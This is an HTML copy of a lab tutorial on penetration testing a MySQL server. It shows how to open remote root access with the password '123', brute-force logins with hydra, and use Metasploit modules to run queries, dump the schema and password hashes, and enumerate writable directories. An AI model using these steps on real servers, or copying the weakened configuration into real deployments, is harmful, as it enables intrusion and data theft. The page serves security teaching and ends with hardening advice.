@@ -1,0 +1,120 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/database-hacking/" rel="category tag">Database Hacking</a>, <a href="https://www.hackingarticles.in/category/nmap/" rel="category tag">Nmap</a></span>            </div>
+            <h1 class="post-title entry-title">Penetration Testing on MYSQL (Port 3306)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-on-mysql-port-3306/" rel="bookmark"><time class="entry-date published" datetime="2024-08-06T12:55:19+00:00">August 6, 2024</time><time class="updated" datetime="2025-06-19T13:23:16+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000"><strong data-start="138" data-end="170">Penetration testing on MySQL</strong> is essential for identifying potential vulnerabilities in one of the most widely used <strong data-start="257" data-end="319">open-source Relational Database Management Systems (RDBMS)</strong>. <strong data-start="321" data-end="330">MySQL</strong> commonly manages and organizes data in a structured format by using <strong data-start="399" data-end="409">tables</strong> to store and access information efficiently. It operates in a <strong data-start="472" data-end="502">client-server architecture</strong>, where the <strong data-start="514" data-end="530">MySQL server</strong> handles database management while <strong data-start="565" data-end="588" data-is-only-node="">client applications</strong> connect to execute queries and updates. Additionally, communication between <strong data-start="665" data-end="682">MySQL clients</strong> and the server takes place over the <strong data-start="719" data-end="738">TCP/IP protocol</strong>, with <strong data-start="745" data-end="754">MySQL</strong> listening on <strong data-start="768" data-end="781">port 3306</strong> by default.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<ul>
+<li><strong><span style="color: #000000">Lab setup</span></strong></li>
+<li><strong><span style="color: #000000">Installation</span></strong></li>
+<li><strong><span style="color: #000000">Connecting to MySQL server</span></strong></li>
+<li><strong><span style="color: #000000">Brute forcing MySQL credentials</span></strong></li>
+<li><strong><span style="color: #000000">Exploitation using Metasploit</span></strong></li>
+<li><strong><span style="color: #000000">Configuring a custom port</span></strong></li>
+<li><strong><span style="color: #000000">Conclusion</span></strong></li>
+</ul>
+<h3><span style="color: #800000">Lab setup</span></h3>
+<p><span style="color: #000000">Target Machine: Ubuntu (192.168.31.205)</span></p>
+<p><span style="color: #000000">Attacker Machine: Kali Linux (192.168.31.141)</span></p>
+<h3><span style="color: #800000">Installation</span></h3>
+<p><span style="color: #000000">We are going to start with the MySQL server setup in the ubuntu machine. The command for installing the server is:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt install mysql-server</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjOhaG0PDzzVjumqnsz3Pu3O3jOhDc5c7OlZx6XRWGT-VIsWaOizqpZhtNLzZmbG54_eJJm8XjKzmLBZsinIrNMkh1H838Nu2p27HWTa0SB1o-8kXQYGvECJh97rsOeEFb2lE9xhQ1ZAvW9VQYiLcHDTp5wQ1hGsdyLVmJR9-AkP0q4XPEmDopM_J-zfx1g/s16000/1.png"/></span></p>
+<p><span style="color: #000000">To check if the server is up and running, use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netstat -tlnp</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9axTX62wbpyfS0xMMm0OUReLM4c0uuBjTtLQk6aWUESqQlgFkM56SayGspmRGB1rslskM452isgnnslRjVZDFXjxwVp8XWhlVa3rT_RaPW7rT1vvxYXLY5_CrgF_-dTe_FsyI6yEJGlMOojY_8jLXXUe0PUHJ4hrCtPnTsacNoSp7C0EI_OcDMbp8dX6a/s16000/2.png"/></span></p>
+<p><span style="color: #000000">It can be seen from above that the server is up and running at port 3306.</span></p>
+<h3><span style="color: #800000">Connecting to MySQL server</span></h3>
+<p><span style="color: #000000">We are going to scan the IP using the <strong>nmap</strong> tool in kali linux to check if the service is showing as closed or open. To do so we will run the following command in kali linux:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p3306 -sV 192.168.31.205</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiO9gUFuU-0_ke4bH49SrAJikt_SkhGdX06l5w49iWsY2uLjYMoNG5UKzxfvwVE_u1DufxMMMM0admLEXJoKgsCDFfF90GxzAEBjl-uyU_FKnUUKMAZM-L9AbkkeMYRZCcBE7F_Zs9Pg9KEysje4tyuCO3qazk7WQhncr0QXzxaS8I_0egLRcf24jnjldJb/s16000/3.png"/></span></p>
+<p><span style="color: #000000">Initially, the scan reveals that <strong data-start="222" data-end="235">port 3306</strong>, where the <strong data-start="247" data-end="264">MySQL service</strong> runs, is <strong data-start="274" data-end="284">closed</strong>. This occurs because the <strong data-start="310" data-end="326">MySQL server</strong> runs <strong data-start="332" data-end="346">internally</strong> on the machine and uses the <strong data-start="375" data-end="391">bind-address</strong> set to <strong data-start="399" data-end="412">127.0.0.1</strong> in the default configuration.</span></p>
+<p><span style="color: #000000">To make the service accessible externally, we must modify the <strong data-start="515" data-end="538">MySQL configuration</strong>. For that, edit the <strong data-start="559" data-end="573">mysqld.cnf</strong> file on the <strong data-start="586" data-end="604">Ubuntu machine</strong> using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/mysql/mysql.conf.d/mysqld.cnf</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBJiPGkfpzEMMHzWcfjAGywFsoFd3SpibvyDh-q-NEojRVFeFn38dyJS0F8kvn02cQ9Whd3-uFYezOZrNgcLSjts8WN8Ab7LCZ1Lv2yXp98ecVKTvepqlsSX_JTW2LmLAwMOjlmEuMt6V0iJsBVyIUe0eG3o-93DpbAuxxFs3gdKVdc1jJzIu_F3_CU65r/s16000/4.png"/></span></p>
+<p><span style="color: #000000">To make the service open, comment out (#) the <strong>bind-address = 127.0.0.1</strong> line.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxpRYbK_zKYskf2QUM7v-pJNWGWEAmlAcvURe4Es8Bn-pdNQeLzhNALIgsJzbLzhKLTSes1CMohbosTy_1L5vSbtmpVLI7I6fg3I3wv7QfD0TfCQ2SxxszIErBLe22G3UBj7pswu3vnNO41SPh-88QjUXZffEkb3SRj9KkjeqrwVP_5-zPwSgB48Z2P1HU/s16000/5.png"/></span></p>
+<p><span style="color: #000000">Now again scan the IP using the <strong>nmap</strong> tool, it can be seen that the service is open now.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p3306 -sV 192.168.31.205
+</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWhHJJBb4g62NsTiMdQuXoOllvPy3T-PiVyFlsDkI0P0JDAJi0viK9g8P7DpH_pmlP-zGVuhW_B52ugKwoCkI8HZ5hlhH3YFF7QkMt2QqhCxuLi12DGgkDXNY8N5cmXWH-8n5aCYjXUiKx4xqQgw1Ozo5LrNANwLoxguJeXS-q2skXgUV2oO2wBJQf8fXA/s16000/7.png"/></span></p>
+<p><span style="color: #000000">However, even if the <strong data-start="718" data-end="735">service state</strong> shows as <strong data-start="745" data-end="753">open</strong>, we still cannot <strong data-start="771" data-end="791">connect remotely</strong> to the <strong data-start="799" data-end="816">MySQL service</strong>. <strong data-start="818" data-end="845">To enable the root user</strong> to connect from any host and perform any action on any <strong data-start="901" data-end="913">database</strong>, execute the following <strong data-start="937" data-end="953">SQL commands</strong> on the <strong data-start="961" data-end="979">Ubuntu machine</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysql -uroot
+CREATE USER 'root'@'%' IDENTIFIED BY '123';
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'%';
+FLUSH PRIVILEGES;</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimCHv3p8TuN89OSlpmbjWBz70pJSfC8rpjUuXn3YbGL7UNNp1mLTrCHwkgqYt-iXUmmMI9PLiMTIWEv8VRLayoHuZ1XuQU7wIJ-u-TFAH0ByMKmq7ocGerqgzsF0o7_dFZ4G7Wq1TlI5L45uz_MlX7fjKthFkixUrlObV0PFd3ZF4ZkIOf28ECEFirkOLs/s16000/8.png"/></span></p>
+<p><span style="color: #000000">The commands from the above can be interpreted as follows:</span></p>
+<p><span style="color: #000000">The first command is used to log into the MySQL server as the <strong>root</strong> user. The second command creates a new user named <strong>root</strong> who can connect from any host (%) and sets the password to <strong>123</strong>. The third command grants the newly created root user all privileges on all databases and tables. The last command reloads the privilege tables, ensuring that the changes take effect immediately.</span></p>
+<p><span style="color: #000000">Now we can check if we can login into the MySQL server remotely by running the following command in kali linux:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysql -h 192.168.31.205 -uroot -p</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKedQLp4t85pKK70ob_jeWevs1-3tt7g76B5CumGV75I104BPsFZBgOwhjnnlM4t2ZhLcK1yOUrDdSDshgyJSpoF-cqFpUYFDUfefKHFk2a4sEeQh0gCugEMe0EWB9SHK-tKIWe3ibsDKXQwMLMf0HNi0WV2RqPHzNF57i1X6yGYTyWxdk5URTf43SE3_j/s16000/10.png"/></span></p>
+<p><span style="color: #000000">Since we are able to connect with the service remotely, now we will start the pentesting.</span></p>
+<h3><span style="color: #800000">Brute forcing MySQL credentials</span></h3>
+<p><span style="color: #000000">Once remote access is verified, the next step in <strong data-start="2753" data-end="2785">penetration testing on MySQL</strong> is credential brute forcing. We can brute force the MySQL credentials by passing a list of usernames and passwords using the <strong>hydra</strong> tool inside kali linux. Here we are using the username list as <strong>users.txt</strong> and the password list as <strong>pass.txt</strong>. The command for brute force attack will be:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L users.txt -P pass.txt 192.168.31.205 mysql</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgfj3S5mCehWgFEhCNSd1sBE1EaSmwY-uXDOEqCH2qTtxvlRC4inUDNza77Q3lotLQAxi7B6bXf-prHXBXhBPEdyZ6ZkzofWO3gJ10sGuBtVkmoXmNZlJUIrMt3J5hZMyDug5dce_rs5Af1etRp3luxjmvqIUCG2IDk6alXayNF8Af8Ojh4kx8TJxlMTvY-/s16000/11.png"/></span></p>
+<h3><span style="color: #800000">Exploitation using Metasploit</span></h3>
+<p><span style="color: #000000">There are lot of exploits and auxiliaries related with the MySQL server. Here we are going to demonstrate few of them to give an insight on the MySQL pentesting.</span></p>
+<p><span style="color: #000000">First we will be using the <strong>auxiliary/admin/mysql/mysql_sql </strong>inside <strong>Metasploit </strong>to run the SQL queries directly after connecting with the database.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -q
+use auxiliary/admin/mysql/mysql_sql
+set rhosts 192.168.31.205
+set username root
+set password 123
+set sql show databases
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi5fr-3FqHkj6Nu_uTif0RlesP_yLx6xWmmEZzKeXoH7gR2jtixpjF5H2_K0BUCKSqh5216CO58_pZSYXb8kFNtLRS4a3RT-SUo0j1vfaqkr4n3hun273fYSvgfDHqevHnrFQEvJG_Cen8B1PekWtXdire6fcTrUGi863Iu850cmfALlEahwdF1yBifQ781/s16000/12.png"/></span></p>
+<p><span style="color: #000000">There is another auxiliary which helps in dumping the entire data, i.e., <strong>auxiliary/scanner/mysql/mysql_schemadump. </strong>We just need to give the username and password to connect with the database and we can dump the entire schema.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mysql/mysql_schemadump
+set rhosts 192.168.31.205
+set username root
+set password 123
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4rGWM7IK5zrg0xfccvSidfbspvh0WoKYqVpv6NioiCyBvisyky1u2DLLPOqbtUeRRoYxdTcOOPVVdPoenYn3M0oe7Ee8oJMxY6A_0rXakDQ14S_2W66SylaP5WPEWT4btzLTF1RwJBwYQQlibhTnDci1y681NxPLl6zjsbceirayOaLl5n0HGyAGgSQSB/s16000/13.png"/></span></p>
+<p><span style="color: #000000">To dump usernames and password hashes, we can use the<strong> auxiliary/scanner/mysql/mysql_hashdump</strong> module. </span><span style="color: #000000">It outputs both usernames and their corresponding password hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mysql/mysql_hashdump
+set rhosts 192.168.31.205
+set username root
+set password 123
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_ip1zNk5dvGyQktWz4pZfhQhzuG8ozBNRYWsl8jneALt_HyheyOLkMB_UMrK2QWKEjSYASplRogu5AG1DMEt2sWBiZpROMojdhCQT6maCQmWG2Cir6m0JUiZ_fyWXHRkPQtAg8NcQtKq6DJQzs6vTTwCrSnrz3pTCgD4nM0-iiSdYPUNM8PuVAA2xOiBu/s16000/14.png"/></span></p>
+<p><span style="color: #000000">In order to check if there is file which is writeable at the server side, we can identify it using the <strong>auxiliary/scanner/mysql/mysql_writable_dirs.</strong> However, it is not possible by default. There is a setting which we need to change in the configuration file after which we can enumerate the writable directory.</span></p>
+<p><span style="color: #000000">To make this configuration, edit the <strong>/etc/mysql/mysql.conf.d/mysqld.cnf </strong>file and add the line <strong>secure_file_priv=</strong> <strong>” </strong><strong>“</strong> at the end.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgoTHrPQjN3GDoDIquBsh2xa7PmrXXadDuBqBZreozltZh8GdB6WxujcX4hEJcdXTtrNEGcgBLstju1t7I-vILTKGMKxvPa-oZefe1TX37kTk8iiUVm2_T6Gh6eOfU368xrg4CcxsZ7tfIaSrf_-nhCxzf5kA57_GLxy36mx8YGxMgwsfxwqyus9MhNFdWj/s16000/17.png"/></span></p>
+<p><span style="color: #000000">Now check for the writable directories using Metasploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/mysql/mysql_writable_dirs
+set rhosts 192.168.31.205
+set username root
+set password 123
+set dir_list dir.txt
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyKeTmQvcnOIQUeB32b-88Pzw6H9qqCiJfbpZB6z6BOguwrf9lZSczq3x_n7zunr-1sjSHgyLqpafR5u8RnPlgwwEmNhQ81Ir020uGSo2-bYHckIbk4cN3BoPUFsShyPpeqI8o8_phimQx6ltIWeYIU82N9XsHimHtKQaSVDZ6Uf0ib4Nr8Aa-CTbGWhAD/s16000/20.png"/></span></p>
+<p><span style="color: #000000">It can be seen from above that the directory <strong>/tmp</strong> is writeable.</span></p>
+<p><span style="color: #000000">To enumerate the files and directories if they exist on the machine or not we can use the <strong>auxiliary/scanner/mysql/mysql_file_enum</strong>. It will give us the results if the directory or file exists or not.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEincobqyXYtDd4yQQ4_VFVhXA4RTfXTHlTnxB7G3WWs1P4azs9IKsbM36Fvg_cch0STgL591EnAtfnCzfO9U7-X92TiaG1oeSdhE7g-pZ0t9nBYD6a6mdp_sCobZlFhMZ7ERMAtreoslq9Z84HvRjGjAdQ3-_2C14P9ELyDj_0uGnRhF3U_fy0NzU9qByCp/s16000/21.png"/></span></p>
+<p><span style="color: #000000">To enumerate the entire MySQL server, we can use the <strong>auxiliary/admin/mysql/mysql_enum</strong> module. </span><span style="color: #000000">This module performs enumeration after we provide valid credentials.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mysql/mysql_enum
+set rhosts 192.168.31.205
+set username root
+set password 123
+run</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEB5QhHWAD5qilH_uX2oN95fH740eM5aXwzObhaQv9eeMrPPTrvJkRQkzrm4XLjMAmEJFH-ja9nTlvnXiRCi5RGOtRM-pYcg4O_95pGPvWBasc_QNHJlduLF5u9TKikRPI1lDgEaYHh27f3InQZKouO3l2URPqChWYy6JxNtsGaKJBW8ZISHwmS3soehNC/s16000/22.png"/></span></p>
+<h3><span style="color: #800000">Configuring a custom port</span></h3>
+<p><span style="color: #000000">To perform the port modification in MySQL, we need to edit the configuration file. The path for the file is <strong>/etc/mysql/mysql.conf.d/mysqld.cnf</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano etc/mysql/mysql.conf.d/mysqld.cnf</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqLXr6Jyr0Wf9o2cS12lKnoquQFuyflQx5E-ixW2JH4sQ0x07uw2krCMXPX216a4zabYTw1PkcwFp5a4wouESuXH_g1eafan9D9TJcPhDlusS0tb4CMK1hmTVnaylNpUBy0e7FL0YjkXUCILKcIgI9u7PnTs4d1LnQoq2f7IWB3rd8wkMU1CM573jOTnd1/s16000/23.png"/></span></p>
+<p><span style="color: #000000">As we can see that the default port is <strong>3306</strong> which is getting used and is commented out (#). We can modify the port number to <strong>4403</strong> and remove the comment (#) from the line.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRK6ks12oDdcpEPcVaLmLALxU0QWL5HAMhrGhQLV63dSZK1K_BxudYFNCtdtb-JwJz6FFutCUpvzBlqWl69sevpKAraub8plC2xAS7tpyb9IcJXheCiheoqEXZbI-0Xu3epzdsW9Oa1itJCC4w2YUsJsQkpaOTWAEYPl1hB9yS7z-P5c2vzso7xA-BYqcE/s16000/24.png"/></span></p>
+<p><span style="color: #000000">Now if we scan the IP using nmap, we can see that the service is up and running at port 4403.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi3605_melACb9EsAgekQ8xLHGOSBtnsywwwANzF7Klhull2y02NckDaXMyyx2YbAbD_5uPis3HCvBPRzp10O0C6Rl_ijeoqcuHCxoGT-C79ttAGZmprU_jVZvkMTcByFJfhPXBtTtrv-7ivhk_iFFFDmCFz97dXSoW6VIsVuSLxLWfYc_ZJyzs8qMQidO-/s16000/26.png"/></span></p>
+<h3><span style="color: #800000">Conclusion</span></h3>
+<p><span style="color: #000000">MySQL has long been a preferred choice for application developers. However, improper configuration can lead to serious data leaks and unauthorized access. <strong data-start="4861" data-end="4893">Penetration testing on MySQL</strong> helps uncover such weaknesses early. We strongly recommend following best practices, secure configuration guidelines, and implementing a robust password policy to harden MySQL servers.</span></p>
+<p><span style="color: #000000"><strong>Author: </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultant. Contact</span> <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
